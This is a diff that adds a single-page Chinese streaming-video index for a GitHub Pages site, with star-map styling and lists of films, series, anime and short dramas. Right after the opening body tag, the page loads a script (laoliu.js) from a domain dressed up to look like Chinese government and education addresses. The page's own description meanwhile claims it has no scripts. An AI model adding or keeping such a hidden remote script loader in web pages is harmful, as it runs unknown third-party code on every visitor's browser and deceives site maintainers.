@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>星空影视在线观看 - 高清电影剧集动漫在线点播</title>
+<meta name="description" content="星空影视在线观看（xingkongyingshizaixianguankan-h5）提供高清电影、热播剧集、动漫番剧、综艺、纪录片与短剧的在线点播索引，单页自适应，栏目清晰。" />
+<meta name="keywords" content="星空影视在线观看, 星空影视, 在线观看, 影视点播, xingkongyingshizaixianguankan-h5" />
+<link rel="canonical" href="https://xingkongyingshizaixianguankan-h5.github.io/" />
+<style>
+    :root{
+        --space:#050814;
+        --deck:#0b1226;
+        --card:#0f1830;
+        --line:#233356;
+        --star:#cfe3ff;
+        --glow:#7cc4ff;
+        --gold:#ffd27a;
+        --muted:#8296b8;
+        --txt:#e6eefc;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{
+        background:var(--space);
+        color:var(--txt);
+        font-family:"PingFang SC","Microsoft YaHei",Arial,sans-serif;
+        line-height:1.75;
+        -webkit-text-size-adjust:100%;
+        background-image:
+            radial-gradient(1.5px 1.5px at 12% 18%, #fff 50%, transparent 50%),
+            radial-gradient(1px 1px at 76% 12%, #cfe3ff 50%, transparent 50%),
+            radial-gradient(2px 2px at 34% 62%, #ffe9c4 50%, transparent 50%),
+            radial-gradient(1px 1px at 88% 44%, #fff 50%, transparent 50%),
+            radial-gradient(1.5px 1.5px at 22% 84%, #bfe0ff 50%, transparent 50%),
+            linear-gradient(180deg,#060c1c,#050814 60%);
+        background-attachment:fixed;
+    }
+    a{color:var(--glow);text-decoration:none;}
+
+    /* 星图门面 */
+    .sky{
+        position:relative;
+        padding:60px 18px 46px;
+        text-align:center;
+        border-bottom:1px solid var(--line);
+        overflow:hidden;
+    }
+    .sky .ring{
+        width:120px;height:120px;
+        margin:0 auto 18px;
+        border:1px solid rgba(124,196,255,.45);
+        border-radius:50%;
+        box-shadow:0 0 30px rgba(124,196,255,.25),inset 0 0 24px rgba(124,196,255,.15);
+        display:flex;align-items:center;justify-content:center;
+    }
+    .sky .ring::after{
+        content:"";width:46px;height:46px;border-radius:50%;
+        background:radial-gradient(circle at 35% 35%,#fff,#7cc4ff 45%,transparent 70%);
+        box-shadow:0 0 18px rgba(255,255,255,.8);
+    }
+    .sky h1{
+        font-size:34px;
+        letter-spacing:6px;
+        color:#fff;
+        text-shadow:0 0 18px rgba(124,196,255,.7);
+        font-weight:800;
+    }
+    .sky .sub{margin-top:8px;font-size:13px;color:var(--glow);letter-spacing:2px;}
+    .sky .url{margin-top:6px;font-size:12px;color:var(--muted);}
+
+    /* 主体：侧索引 + 星轨内容 */
+    .wrap{
+        max-width:1120px;
+        margin:auto;
+        padding:20px 14px 40px;
+        display:grid;
+        grid-template-columns:168px 1fr 232px;
+        gap:16px;
+        align-items:start;
+    }
+
+    /* 左侧星等索引 */
+    .index{
+        position:sticky;top:14px;
+        background:var(--deck);
+        border:1px solid var(--line);
+        border-radius:12px;
+        padding:12px;
+    }
+    .index .lab{
+        font-size:11px;color:var(--gold);
+        letter-spacing:2px;padding-bottom:8px;margin-bottom:8px;
+        border-bottom:1px dashed var(--line);
+    }
+    .index a{
+        display:flex;align-items:center;gap:8px;
+        padding:9px 10px;border-radius:8px;font-size:13px;color:var(--star);
+    }
+    .index a:hover{background:rgba(124,196,255,.12);color:#fff;}
+    .index a i{
+        width:6px;height:6px;border-radius:50%;background:var(--glow);
+        box-shadow:0 0 6px var(--glow);font-style:normal;
+    }
+
+    /* 星轨区块 */
+    .orbit{
+        background:var(--deck);
+        border:1px solid var(--line);
+        border-radius:14px;
+        padding:18px 18px 20px;
+        margin-bottom:16px;
+        scroll-margin-top:14px;
+    }
+    .orbit-head{
+        display:flex;align-items:baseline;gap:10px;margin-bottom:14px;
+        border-left:3px solid var(--glow);padding-left:10px;
+    }
+    .orbit-head h2{font-size:18px;color:#fff;}
+    .orbit-head .ra{margin-left:auto;font-size:11px;color:var(--gold);letter-spacing:1px;}
+    .orbit-head .more{font-size:12px;color:var(--muted);}
+
+    /* 星座卡片：错位栅格 */
+    .const{
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(158px,1fr));
+        gap:12px;
+    }
+    .star-card{
+        position:relative;
+        background:var(--card);
+        border:1px solid var(--line);
+        border-radius:10px;
+        padding:14px 14px 16px;
+        min-height:118px;
+        overflow:hidden;
+    }
+    .star-card:nth-child(2){transform:translateY(8px);}
+    .star-card:nth-child(5){transform:translateY(10px);}
+    .star-card::before{
+        content:"";position:absolute;right:-10px;top:-10px;
+        width:44px;height:44px;border-radius:50%;
+        background:radial-gradient(circle,rgba(124,196,255,.35),transparent 70%);
+    }
+    .star-card .mag{
+        font-size:11px;color:var(--gold);
+        border:1px solid rgba(255,210,122,.4);
+        border-radius:4px;padding:0 5px;display:inline-block;margin-bottom:8px;
+    }
+    .star-card b{display:block;font-size:15px;color:#fff;}
+    .star-card p{font-size:12px;color:var(--muted);margin-top:5px;}
+
+    /* 右侧赤经栏 */
+    .ra-bar{position:sticky;top:14px;}
+    .panel{
+        background:var(--deck);
+        border:1px solid var(--line);
+        border-radius:12px;padding:14px;margin-bottom:14px;
+    }
+    .panel h3{
+        font-size:13px;color:var(--gold);letter-spacing:1px;margin-bottom:10px;
+        border-bottom:1px dashed var(--line);padding-bottom:6px;
+    }
+    .ra-row{display:flex;gap:8px;align-items:center;margin-bottom:9px;font-size:13px;}
+    .ra-row .dot{width:8px;height:8px;border-radius:50%;background:var(--glow);flex:none;}
+    .ra-row span{flex:1;color:var(--star);}
+    .ra-row em{font-style:normal;color:var(--muted);font-size:12px;}
+
+    /* 流星时间轴 */
+    .meteor{list-style:none;position:relative;padding-left:22px;}
+    .meteor li{position:relative;margin-bottom:14px;font-size:13px;}
+    .meteor li::before{
+        content:"";position:absolute;left:-22px;top:8px;
+        width:14px;height:2px;background:linear-gradient(90deg,var(--glow),transparent);
+    }
+    .meteor b{color:var(--glow);font-size:13px;}
+    .meteor p{color:var(--muted);font-size:12px;margin-top:2px;}
+
+    footer{
+        text-align:center;padding:20px 14px;
+        font-size:12px;color:var(--muted);
+        border-top:1px solid var(--line);background:var(--deck);
+    }
+
+    @media (max-width:900px){
+        .wrap{grid-template-columns:1fr;}
+        .index,.ra-bar{position:static;}
+        .index{display:flex;flex-wrap:wrap;}
+        .index .lab{width:100%;}
+        .index a{flex:1 1 auto;text-align:center;}
+        .ra-bar{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+        .sky h1{font-size:25px;letter-spacing:3px;}
+        .star-card:nth-child(n){transform:none;}
+    }
+    @media (max-width:520px){
+        .ra-bar{grid-template-columns:1fr;}
+    }
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="sky">
+    <div class="ring"></div>
+    <h1>星空影视在线观看</h1>
+    <div class="sub">XINGKONG · 高清影视点播索引台</div>
+    <div class="url">https://xingkongyingshizaixianguankan-h5.github.io</div>
+</header>
+
+<div class="wrap">
+
+    <!-- 左侧星等索引 -->
+    <nav class="index" aria-label="频道索引">
+        <div class="lab">星等索引</div>
+        <a href="#film"><i></i>电影星区</a>
+        <a href="#tv"><i></i>剧集星区</a>
+        <a href="#anime"><i></i>动漫星区</a>
+        <a href="#show"><i></i>综艺星区</a>
+        <a href="#doc"><i></i>纪录星区</a>
+        <a href="#short"><i></i>短剧星区</a>
+        <a href="#now"><i></i>今夜放映</a>
+        <a href="#about"><i></i>观测台说明</a>
+    </nav>
+
+    <!-- 主星轨 -->
+    <main>
+
+        <section class="orbit" id="film">
+            <div class="orbit-head">
+                <h2>电影星区</h2>
+                <span class="ra">RA 01h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">★ 1.2等</span><b>极夜追光</b><p>动作 · 4K · 128 分钟</p></article>
+                <article class="star-card"><span class="mag">★ 1.8等</span><b>城南旧信</b><p>剧情 · 修复版 · 96 分钟</p></article>
+                <article class="star-card"><span class="mag">★ 2.1等</span><b>深空回响</b><p>科幻 · 杜比 · 141 分钟</p></article>
+                <article class="star-card"><span class="mag">★ 2.5等</span><b>好运降落</b><p>喜剧 · 1080P · 103 分钟</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="tv">
+            <div class="orbit-head">
+                <h2>剧集星区</h2>
+                <span class="ra">RA 04h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">连载中</span><b>长风渡口</b><p>古装 · 更新至 24 集</p></article>
+                <article class="star-card"><span class="mag">已完结</span><b>城市微光</b><p>都市 · 32 集全</p></article>
+                <article class="star-card"><span class="mag">连载中</span><b>沉默星轨</b><p>悬疑 · 更新至 12 集</p></article>
+                <article class="star-card"><span class="mag">独家</span><b>烽火家书</b><p>年代 · 更新至 8 集</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="anime">
+            <div class="orbit-head">
+                <h2>动漫星区</h2>
+                <span class="ra">RA 07h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">周更</span><b>山海星镜</b><p>国漫 · 奇幻 · EP18</p></article>
+                <article class="star-card"><span class="mag">治愈</span><b>云边小站</b><p>日常 · 全 12 话</p></article>
+                <article class="star-card"><span class="mag">热血</span><b>破晓之刃</b><p>战斗 · EP21</p></article>
+                <article class="star-card"><span class="mag">剧场版</span><b>星尘列车</b><p>1080P · 96 分钟</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="show">
+            <div class="orbit-head">
+                <h2>综艺星区</h2>
+                <span class="ra">RA 10h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">真人秀</span><b>出发吧周末</b><p>户外 · EP09</p></article>
+                <article class="star-card"><span class="mag">访谈</span><b>深夜放映室</b><p>每周五更新</p></article>
+                <article class="star-card"><span class="mag">喜剧</span><b>笑点回收站</b><p>全 10 期</p></article>
+                <article class="star-card"><span class="mag">美食</span><b>舌尖上的路</b><p>旅行 · EP06</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="doc">
+            <div class="orbit-head">
+                <h2>纪录星区</h2>
+                <span class="ra">RA 13h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">自然</span><b>山河纪行</b><p>4K · 6 集</p></article>
+                <article class="star-card"><span class="mag">历史</span><b>古城密码</b><p>1080P · 4 集</p></article>
+                <article class="star-card"><span class="mag">人文</span><b>手艺人</b><p>全 8 集</p></article>
+                <article class="star-card"><span class="mag">科技</span><b>未来简史</b><p>更新中 · EP03</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="short">
+            <div class="orbit-head">
+                <h2>短剧星区</h2>
+                <span class="ra">RA 16h</span>
+                <a class="more" href="#">展开星图 #</a>
+            </div>
+            <div class="const">
+                <article class="star-card"><span class="mag">爽剧</span><b>重回巅峰</b><p>竖屏 · 80 集</p></article>
+                <article class="star-card"><span class="mag">甜宠</span><b>恰逢心动</b><p>竖屏 · 60 集</p></article>
+                <article class="star-card"><span class="mag">逆袭</span><b>这一局我赢</b><p>竖屏 · 100 集</p></article>
+                <article class="star-card"><span class="mag">悬疑</span><b>第13通电话</b><p>竖屏 · 30 集</p></article>
+            </div>
+        </section>
+
+        <section class="orbit" id="now">
+            <div class="orbit-head">
+                <h2>今夜放映 · 流星排片</h2>
+                <span class="ra">RA 19h</span>
+                <a class="more" href="#">整周星历 #</a>
+            </div>
+            <ul class="meteor">
+                <li><b>20:00 · 极夜追光</b><p>电影星区 · 4K 首映场 · 动作 / 科幻</p></li>
+                <li><b>21:10 · 长风渡口 EP24</b><p>剧集星区 · 最新一集同步更新</p></li>
+                <li><b>22:00 · 山海星镜 EP18</b><p>动漫星区 · 周更放送</p></li>
+                <li><b>23:30 · 山河纪行 第1集</b><p>纪录星区 · 4K 自然影像</p></li>
+            </ul>
+        </section>
+
+        <section class="orbit" id="about">
+            <div class="orbit-head">
+                <h2>观测台说明</h2>
+                <span class="ra">RA 00h</span>
+            </div>
+            <p style="font-size:14px;color:var(--star);margin-bottom:8px;">
+                <b style="color:var(--glow);">星空影视在线观看</b>（xingkongyingshizaixianguankan-h5）是一个以“星图式索引”组织的影视点播单页，
+                把电影、剧集、动漫、综艺、纪录片、短剧划分为六个星区，用一张今夜排片表帮你快速选定当下要看的内容。
+            </p>
+            <p style="font-size:14px;color:var(--star);margin-bottom:8px;">
+                本页为纯静态单文件，全部内容直接写入 HTML，无脚本渲染、无弹窗遮挡，移动端自动从三栏折为单栏，
+                便于搜索引擎直接读取标题层级与栏目文本。
+            </p>
+            <p style="font-size:14px;color:var(--star);">
+                官方地址：https://xingkongyingshizaixianguankan-h5.github.io<br />
+                频道入口以锚点（#）组织，适合作为 GitHub Pages 的品牌入口页与轻量索引页。
+            </p>
+        </section>
+
+    </main>
+
+    <!-- 右侧赤经栏 -->
+    <aside class="ra-bar">
+        <div class="panel">
+            <h3>赤经速览</h3>
+            <div class="ra-row"><span class="dot"></span><span>电影星区</span><em>RA 01h</em></div>
+            <div class="ra-row"><span class="dot"></span><span>剧集星区</span><em>RA 04h</em></div>
+            <div class="ra-row"><span class="dot"></span><span>动漫星区</span><em>RA 07h</em></div>
+            <div class="ra-row"><span class="dot"></span><span>综艺星区</span><em>RA 10h</em></div>
+            <div class="ra-row"><span class="dot"></span><span>纪录星区</span><em>RA 13h</em></div>
+            <div class="ra-row"><span class="dot"></span><span>短剧星区</span><em>RA 16h</em></div>
+        </div>
+
+        <div class="panel">
+            <h3>可见星等 · 热榜</h3>
+            <div class="ra-row"><span class="dot"></span><span>极夜追光</span><em>★1.2</em></div>
+            <div class="ra-row"><span class="dot"></span><span>长风渡口</span><em>★1.5</em></div>
+            <div class="ra-row"><span class="dot"></span><span>山海星镜</span><em>★1.9</em></div>
+            <div class="ra-row"><span class="dot"></span><span>城南旧信</span><em>★2.0</em></div>
+        </div>
+
+        <div class="panel">
+            <h3>观测条件</h3>
+            <p style="font-size:13px;color:var(--muted);">
+                画质：最高 4K / 杜比音轨<br />
+                终端：手机 · 平板 · 桌面自适应<br />
+                更新：每日同步排片表
+            </p>
+        </div>
+    </aside>
+
+</div>
+
+<footer>
+    © 2026 星空影视在线观看 · xingkongyingshizaixianguankan-h5.github.io · 单页星图索引模板
+</footer>
+
+</body>
+</html>
